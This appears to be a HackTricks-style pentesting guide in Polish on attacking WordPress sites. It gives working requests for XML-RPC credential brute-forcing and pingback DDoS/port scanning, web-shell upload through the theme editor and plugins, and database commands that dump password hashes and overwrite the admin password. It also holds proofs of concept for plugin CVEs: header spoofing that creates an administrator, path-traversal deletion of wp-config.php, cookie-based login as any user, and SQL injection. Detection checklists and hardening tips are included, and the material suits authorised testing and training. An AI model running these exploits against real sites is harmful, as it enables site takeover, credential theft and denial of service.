# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

- **Przesłane** pliki trafiają do: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Pliki motywów znajdują się w /wp-content/themes/,** więc jeśli zmienisz jakiś php motywu, aby uzyskać RCE, prawdopodobnie użyjesz tej ścieżki. Na przykład: Używając **theme twentytwelve** możesz **dostępować** do pliku **404.php** w: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Inny przydatny adres może być:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- W **wp-config.php** możesz znaleźć hasło root do bazy danych.
- Domyślne ścieżki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` zawiera przydatne informacje, takie jak zainstalowana wersja WordPress.
- `wp-activate.php` jest używany podczas procesu aktywacji przez email przy zakładaniu nowej strony WordPress.
- Foldery logowania (mogą być przemianowane, aby je ukryć):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` to plik będący funkcją WordPress, która umożliwia przesyłanie danych z HTTP jako mechanizmem transportu i XML jako mechanizmem kodowania. Ten typ komunikacji został zastąpiony przez WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` jest głównym katalogiem, w którym przechowywane są pluginy i motywy.
- `wp-content/uploads/` to katalog, w którym przechowywane są wszystkie pliki przesłane na platformę.
- `wp-includes/` to katalog, w którym przechowywane są pliki core, takie jak certyfikaty, czcionki, pliki JavaScript i widgety.
- `wp-sitemap.xml` W wersjach Wordpress 5.5 i nowszych, Wordpress generuje plik sitemap XML ze wszystkimi publicznymi wpisami oraz publicznie zapytalnymi typami wpisów i taksonomiami.

**Post exploitation**

- Plik `wp-config.php` zawiera informacje wymagane przez WordPress do połączenia z bazą danych, takie jak nazwa bazy danych, host bazy danych, nazwa użytkownika i hasło, klucze uwierzytelniania i salts oraz prefiks tabel bazy danych. Ten plik konfiguracyjny może być również użyty do aktywacji trybu DEBUG, co może być przydatne w rozwiązywaniu problemów.

### Uprawnienia użytkowników

- **Administrator**
- **Editor**: Publikuje i zarządza swoimi oraz cudzymi wpisami
- **Author**: Publikuje i zarządza własnymi wpisami
- **Contributor**: Pisze i zarządza swoimi wpisami, ale nie może ich publikować
- **Subscriber**: Przegląda wpisy i edytuje swój profil

## **Passive Enumeration**

### **Sprawdź wersję WordPress**

Sprawdź, czy możesz znaleźć pliki `/license.txt` lub `/readme.html`

Wewnątrz **kod źródłowy** strony (przykład z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- pliki linków CSS

![](<../../images/image (533).png>)

- pliki JavaScript

![](<../../images/image (524).png>)

### Pobierz wtyczki
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pobierz motywy
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Ogólne wyodrębnianie wersji
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktywna enumeracja

### Plugins and Themes

Prawdopodobnie nie będziesz w stanie znaleźć wszystkich Plugins i Themes. Aby odkryć wszystkie, będziesz musiał(a) **aktywnie Brute Force listę Plugins i Themes** (na szczęście istnieją zautomatyzowane narzędzia, które zawierają takie listy).

### Użytkownicy

- **ID Brute:** Otrzymujesz prawidłowych użytkowników z serwisu WordPress poprzez Brute Forcing identyfikatorów użytkowników:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Jeśli odpowiedzi mają status **200** lub **30X**, oznacza to, że id jest **prawidłowe**. Jeśli odpowiedź ma status **400**, to id jest **nieprawidłowe**.

- **wp-json:** Możesz także próbować uzyskać informacje o użytkownikach, zapytując:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Inny endpoint `/wp-json/`, który może ujawnić pewne informacje o użytkownikach, to:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Zwróć uwagę, że ten endpoint ujawnia tylko użytkowników, którzy opublikowali post. **Dostarczone zostaną tylko informacje o użytkownikach, którzy mają tę funkcję włączoną**.

Zwróć też uwagę, że **/wp-json/wp/v2/pages** może leak IP addresses.

- **Login username enumeration**: Podczas logowania przez **`/wp-login.php`** **komunikat** jest **inny** i wskazuje, czy podany **username** istnieje, czy nie.

### XML-RPC

Jeśli `xml-rpc.php` jest aktywny, możesz przeprowadzić credentials brute-force lub użyć go do uruchomienia DoS attacks na inne zasoby. (Możesz zautomatyzować ten proces[ using this](https://github.com/relarizky/wpxploit) na przykład).

Aby sprawdzić, czy jest aktywny, spróbuj uzyskać dostęp do _**/xmlrpc.php**_ i wyślij to żądanie:

**Sprawdź**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Poświadczenia Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** są niektórymi z metod, które można wykorzystać do brute-force poświadczeń. Jeśli znajdziesz którąkolwiek z nich, możesz wysłać coś takiego:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Komunikat _"Incorrect username or password"_ w odpowiedzi ze statusem 200 powinien się pojawić, jeśli poświadczenia są nieprawidłowe.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Używając poprawnych poświadczeń możesz przesłać plik. W odpowiedzi pojawi się ścieżka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Ta metoda jest przeznaczona dla programów, nie dla ludzi, i jest stara — w związku z tym nie obsługuje 2FA. Jeśli więc masz valid creds, ale główny dostęp jest chroniony 2FA, **możesz być w stanie wykorzystać xmlrpc.php, aby zalogować się tymi creds, omijając 2FA**. Zwróć uwagę, że nie będziesz mógł wykonać wszystkich akcji dostępnych z poziomu konsoli, ale nadal możesz dojść do RCE, jak wyjaśnia Ippsec w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Jeśli otrzymasz **faultCode** z wartością **większą** niż **0** (17), oznacza to, że port jest otwarty.

Zobacz użycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieć się, jak nadużyć tej metody i spowodować DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ten plik zwykle znajduje się w katalogu głównym strony Wordpress: **`/wp-cron.php`**\
Gdy ten plik zostanie **accessed**, wykonywane jest "**heavy**" zapytanie MySQL (**query**), więc może być użyty przez **attackers** do spowodowania **DoS**.\
Domyślnie `wp-cron.php` jest wywoływany przy każdym ładowaniu strony (za każdym razem gdy klient żąda dowolnej strony Wordpress), co na serwisach o dużym ruchu może powodować problemy (DoS).

Zaleca się wyłączenie Wp-Cron i utworzenie prawdziwego cronjob na hoście, który będzie wykonywał potrzebne akcje w regularnych odstępach (bez powodowania problemów).

### /wp-json/oembed/1.0/proxy - SSRF

Spróbuj uzyskać dostęp do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ a strona Worpress może wykonać żądanie do Ciebie.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

To narzędzie sprawdza, czy istnieje **methodName: pingback.ping** oraz ścieżka **/wp-json/oembed/1.0/proxy**, a jeśli tak, próbuje je wykorzystać.

## Automatyczne narzędzia
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Uzyskaj dostęp przez nadpisanie bitu

To bardziej ciekawostka niż prawdziwy atak. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) można było odwrócić 1 bit w dowolnym pliku wordpress. Można było więc odwrócić pozycję `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zastąpić operację NOT (`!`) instrukcją NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja pliku php z używanego motywu (potrzebne dane logowania admina)**

Wygląd → Edytor motywów → Szablon 404 (po prawej)

Zmień zawartość na php shell:

![](<../../images/image (384).png>)

Wyszukaj w internecie, jak uzyskać dostęp do tej zaktualizowanej strony. W tym przypadku musisz wejść tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Możesz użyć:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
aby uzyskać sesję.

## RCE przez wtyczkę

### Wtyczka PHP

Możliwe, że da się przesłać pliki .php jako wtyczkę.  
Utwórz swój php backdoor używając na przykład:

![](<../../images/image (183).png>)

Następnie dodaj nową wtyczkę:

![](<../../images/image (722).png>)

Prześlij wtyczkę i naciśnij Install Now:

![](<../../images/image (249).png>)

Kliknij na Procced:

![](<../../images/image (70).png>)

Prawdopodobnie to pozornie nic nie zrobi, ale jeśli przejdziesz do Media, zobaczysz przesłany shell:

![](<../../images/image (462).png>)

Otwórz go, a zobaczysz URL do uruchomienia reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ta metoda polega na instalacji złośliwej wtyczki, o której wiadomo, że jest podatna i którą można wykorzystać do uzyskania web shella. Proces przeprowadza się przez dashboard WordPress w następujący sposób:

1. **Plugin Acquisition**: wtyczka jest pobierana ze źródła takiego jak Exploit DB jak [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Przejdź do panelu WordPress, następnie do `Dashboard > Plugins > Upload Plugin`.
- Prześlij plik zip pobranej wtyczki.
3. **Plugin Activation**: Po pomyślnej instalacji wtyczkę należy aktywować przez dashboard.
4. **Exploitation**:
- Po zainstalowaniu i aktywowaniu wtyczki "reflex-gallery" można ją wykorzystać, ponieważ jest znana z bycia podatną.
- Metasploit framework udostępnia exploit dla tej podatności. Załadowanie odpowiedniego modułu i wykonanie specyficznych poleceń pozwala uzyskać sesję meterpreter, dając nieautoryzowany dostęp do serwisu.
- Należy zauważyć, że to tylko jedna z wielu metod wykorzystania strony WordPress.

Treść zawiera materiały wizualne przedstawiające kroki w dashboard WordPress dotyczące instalacji i aktywacji wtyczki. Jednak ważne jest, aby zaznaczyć, że wykorzystywanie podatności w ten sposób jest nielegalne i nieetyczne bez odpowiedniej autoryzacji. Informacje te powinny być używane odpowiedzialnie i jedynie w kontekście prawnym, takich jak testy penetracyjne z wyraźną zgodą.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ to skrypt zaprojektowany do eskalacji podatności **Cross-Site Scripting (XSS)** do **Remote Code Execution (RCE)** lub innych krytycznych podatności w WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Zapewnia **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Tworzy użytkownika w WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Prześlij własną wtyczkę (backdoor) do WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edytuj wbudowaną wtyczkę w WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edytuj wbudowany motyw w WordPress.
- _**(Custom) Custom Exploits:**_ Własne exploity dla third-party WordPress Plugins/Themes.

## Post Exploitation

Wydobądź nazwy użytkowników i hasła:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Zmień hasło administratora:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Powierzchnia ataku

Zrozumienie, w jaki sposób wtyczka Wordpress może ujawniać funkcjonalność, jest kluczowe do odnalezienia podatności w jej działaniu. Możesz zobaczyć, w jaki sposób wtyczka może ujawniać funkcje w poniższych punktach oraz znaleźć kilka przykładów podatnych wtyczek w [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jednym ze sposobów, w jaki wtyczka może udostępniać funkcje użytkownikom, są obsługi AJAX. Mogą one zawierać błędy w logice, autoryzacji lub uwierzytelnianiu. Co więcej, dość często te funkcje opierają zarówno uwierzytelnianie, jak i autoryzację na istnieniu wordpress nonce, które **każdy użytkownik zalogowany w instancji Wordpress może posiadać** (niezależnie od roli).

Oto funkcje, które mogą być użyte do udostępnienia funkcji we wtyczce:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Użycie `nopriv` sprawia, że endpoint jest dostępny dla wszystkich użytkowników (nawet niezalogowanych).**

> [!CAUTION]
> Co więcej, jeśli funkcja jedynie sprawdza autoryzację użytkownika za pomocą funkcji `wp_verify_nonce`, ta funkcja tylko sprawdza, czy użytkownik jest zalogowany — zwykle nie weryfikuje roli użytkownika. W związku z tym użytkownicy o niskich uprawnieniach mogą mieć dostęp do operacji wymagających wyższych uprawnień.

- **REST API**

Możliwe jest również udostępnienie funkcji z wordpressa przez zarejestrowanie REST API za pomocą funkcji `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` to callback do funkcji, która sprawdza, czy dany użytkownik jest uprawniony do wywołania metody API.

**Jeśli użyta zostanie wbudowana funkcja `__return_true`, po prostu pominie ona sprawdzenie uprawnień użytkownika.**

- **Bezpośredni dostęp do pliku php**

Oczywiście Wordpress używa PHP, a pliki wewnątrz wtyczek są bezpośrednio dostępne z sieci. Jeśli wtyczka udostępnia podatną funkcjonalność, która jest wywoływana jedynie przez dostęp do pliku, będzie ona możliwa do wykorzystania przez każdego użytkownika.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Niektóre wtyczki implementują skróty "trusted header" dla integracji wewnętrznych lub reverse proxies i następnie używają tego headera do ustawienia aktualnego kontekstu użytkownika dla żądań REST. Jeśli header nie jest kryptograficznie powiązany z żądaniem przez komponent upstream, atakujący może go sfałszować i trafić na uprzywilejowane REST route'y jako administrator.

- Wpływ: eskalacja uprawnień bez uwierzytelnienia do roli administratora przez utworzenie nowego administratora za pomocą core users REST route.
- Przykładowy header: `X-Wcpay-Platform-Checkout-User: 1` (wymusza user ID 1, zazwyczaj pierwsze konto administratora).
- Wykorzystywana ścieżka: `POST /wp-json/wp/v2/users` z tablicą z podwyższoną rolą.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Dlaczego to działa

- Wtyczka mapuje nagłówek kontrolowany przez klienta na stan uwierzytelnienia i pomija sprawdzanie uprawnień.
- WordPress core oczekuje uprawnienia `create_users` dla tej ścieżki; hack wtyczki omija to przez bezpośrednie ustawienie kontekstu bieżącego użytkownika na podstawie nagłówka.

Oczekiwane wskaźniki sukcesu

- HTTP 201 z ciałem JSON opisującym utworzonego użytkownika.
- Nowy użytkownik z uprawnieniami administratora widoczny w `wp-admin/users.php`.

Lista kontrolna wykrywania

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Przejrzyj rejestracje REST pod kątem uprzywilejowanych callbacków, które nie mają solidnych sprawdzeń `permission_callback` i zamiast tego polegają na nagłówkach żądania.
- Szukaj użyć funkcji zarządzania użytkownikami rdzenia (`wp_insert_user`, `wp_create_user`) wewnątrz handlerów REST, które są zabezpieczone jedynie przez wartości nagłówków.

### Nieautoryzowane dowolne usuwanie plików przez wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemy wprowadzone przez ten fragment:

* **Unauthenticated access** – the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** – każdy odwiedzający może wywołać endpoint.
* **No path sanitisation** – ciąg kontrolowany przez użytkownika `fontfamily` jest konkatenowany do filesystem path bez filtrowania, co pozwala na klasyczny `../../` traversal.

#### Eksploatacja

Atakujący może usunąć dowolny plik lub katalog **poniżej katalogu bazowego uploads** (zazwyczaj `<wp-root>/wp-content/uploads/`) wysyłając jedno żądanie HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Ponieważ `wp-config.php` znajduje się poza *uploads*, cztery sekwencje `../` wystarczą w domyślnej instalacji. Usunięcie `wp-config.php` wymusza na WordPress uruchomienie *kreatora instalacji* przy następnej wizycie, umożliwiając pełne przejęcie serwisu (atakujący jedynie dostarcza nową konfigurację DB i tworzy konto admina).

Inne istotne cele to pliki `.php` w pluginach/motywach (aby złamać security plugins) lub reguły `.htaccess`.

#### Lista kontrolna wykrywania

* Każde wywołanie zwrotne `add_action( 'wp_ajax_nopriv_...')`, które wywołuje helpery systemu plików (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itp.).
* Łączenie niesanitizowanych danych wejściowych użytkownika w ścieżki (szukaj `$_POST`, `$_GET`, `$_REQUEST`).
* Brak `check_ajax_referer()` oraz `current_user_can()`/`is_user_logged_in()`.

---

### Eskalacja uprawnień przez przywracanie przestarzałych ról i brak autoryzacji (ASE "View Admin as Role")

Wiele pluginów implementuje funkcję "view as role" lub tymczasowej zmiany roli poprzez zapisanie oryginalnej(ych) roli(i) w user meta, aby móc je przywrócić później. Jeśli ścieżka przywracania opiera się jedynie na parametrach żądania (np. `$_REQUEST['reset-for']`) i liście utrzymywanej przez wtyczkę bez sprawdzania uprawnień i ważnego nonce, staje się to wertykalną eskalacją uprawnień.

Przykład z rzeczywistego świata znaleziono we wtyczce Admin and Site Enhancements (ASE) (≤ 7.6.2.1). Gałąź resetu przywracała role na podstawie `reset-for=<username>` jeśli nazwa użytkownika pojawiła się w wewnętrznej tablicy `$options['viewing_admin_as_role_are']`, ale nie wykonywała ani sprawdzenia `current_user_can()` ani weryfikacji nonce przed usunięciem obecnych ról i ponownym dodaniem zapisanych ról z user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Dlaczego jest to eksploatowalne

- Polega na zaufaniu do `$_REQUEST['reset-for']` i opcji wtyczki bez autoryzacji po stronie serwera.
- Jeśli użytkownik wcześniej miał wyższe uprawnienia zapisane w `_asenha_view_admin_as_original_roles` i został zdegradowany, może je przywrócić, odwiedzając ścieżkę resetu.
- W niektórych wdrożeniach każdy uwierzytelniony użytkownik mógł wywołać reset dla innej nazwy użytkownika nadal obecnej w `viewing_admin_as_role_are` (błędna autoryzacja).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
W podatnych buildach usuwa to bieżące role i ponownie dodaje zapisane oryginalne role (np. `administrator`), skutecznie eskalując uprawnienia.

Detection checklist

- Szukaj funkcji przełączania ról, które zapisują „original roles” w user meta (np. `_asenha_view_admin_as_original_roles`).
- Zidentyfikuj ścieżki reset/restore, które:
- Odczytują nazwy użytkowników z `$_REQUEST` / `$_GET` / `$_POST`.
- Modyfikują role za pomocą `add_role()` / `remove_role()` bez `current_user_can()` oraz `wp_verify_nonce()` / `check_admin_referer()`.
- Autoryzują na podstawie tablicy opcji wtyczki (np. `viewing_admin_as_role_are`) zamiast na podstawie uprawnień aktora.

---

### Nieautoryzowana eskalacja uprawnień przez przełączanie użytkownika oparte na zaufanym ciasteczku na publicznym init (Service Finder “sf-booking”)

Niektóre wtyczki podpinają helpery do user-switching pod publiczny hook `init` i pobierają tożsamość z ciasteczka kontrolowanego przez klienta. Jeśli kod wywołuje `wp_set_auth_cookie()` bez weryfikacji uwierzytelnienia, uprawnień i ważnego nonce, każdy nieautoryzowany odwiedzający może wymusić zalogowanie jako dowolny identyfikator użytkownika.

Typowy podatny wzorzec (uproszczone z Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Dlaczego jest to podatne

- Publiczny hook `init` sprawia, że handler jest dostępny dla niezalogowanych użytkowników (brak zabezpieczenia `is_user_logged_in()`).
- Tożsamość jest odczytywana z cookie modyfikowalnego po stronie klienta (`original_user_id`).
- Bezpośrednie wywołanie `wp_set_auth_cookie($uid)` loguje żądającego jako tego użytkownika bez jakichkolwiek sprawdzeń capability/nonce.

Eksploatacja (bez uwierzytelnienia)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Ogólne WAFy brzegowe/serwerowe są nastawione na wykrywanie szerokich wzorców (SQLi, XSS, LFI). Wiele wysokiego ryzyka luk w WordPress i wtyczkach to błędy logiki/autoryzacji specyficzne dla aplikacji, które wyglądają jak nieszkodliwy ruch, chyba że silnik rozumie trasy WordPress i semantykę wtyczek.

Offensive notes

- Celuj w endpointy specyficzne dla wtyczek przy użyciu czystych payloadów: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Najpierw testuj ścieżki nieautoryzowane (AJAX `nopriv`, REST z liberalnym `permission_callback`, public shortcodes). Domyślne payloady często działają bez obfuskacji.
- Typowe przypadki o dużym wpływie: eskalacja uprawnień (broken access control), dowolne przesyłanie/pobieranie plików, LFI, open redirect.

Defensive notes

- Nie polegaj na ogólnych sygnaturach WAF, aby chronić CVE dotyczące wtyczek. Wdroż wirtualne poprawki specyficzne dla podatności na warstwie aplikacji lub zaktualizuj szybko.
- Preferuj mechanizmy pozytywnej ochrony w kodzie (capabilities, nonces, ścisła walidacja wejścia) zamiast negatywnych filtrów regex.

## Ochrona WordPress

### Regularne aktualizacje

Upewnij się, że WordPress, wtyczki i motywy są aktualne. Potwierdź także, że automatyczne aktualizacje są włączone w wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Ponadto, **instaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki zabezpieczające

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne zalecenia**

- Usuń domyślnego użytkownika **admin**
- Używaj **silnych haseł** i **2FA**
- Okresowo **przeglądaj** **uprawnienia** użytkowników
- **Ogranicz liczbę prób logowania**, aby zapobiec atakom Brute Force
- Zmień nazwę pliku **`wp-admin.php`** i zezwalaj na dostęp tylko wewnętrznie lub z określonych adresów IP.


### Nieuwierzytelniony SQL Injection z powodu niewystarczającej walidacji (WP Job Portal <= 2.3.2)

Wtyczka rekrutacyjna WP Job Portal udostępniała zadanie **savecategory**, które ostatecznie wykonuje następujący podatny kod w `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemy wprowadzone przez ten fragment:

1. **Unsanitised user input** – `parentid` pochodzi bezpośrednio z żądania HTTP.
2. **String concatenation inside the WHERE clause** – brak użycia `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – chociaż akcja jest wykonywana przez `admin-post.php`, jedyną kontrolą jest **CSRF nonce** (`wp_verify_nonce()`), który każdy odwiedzający może pobrać ze strony publicznej osadzonej przy pomocy shortcode `[wpjobportal_my_resumes]`.

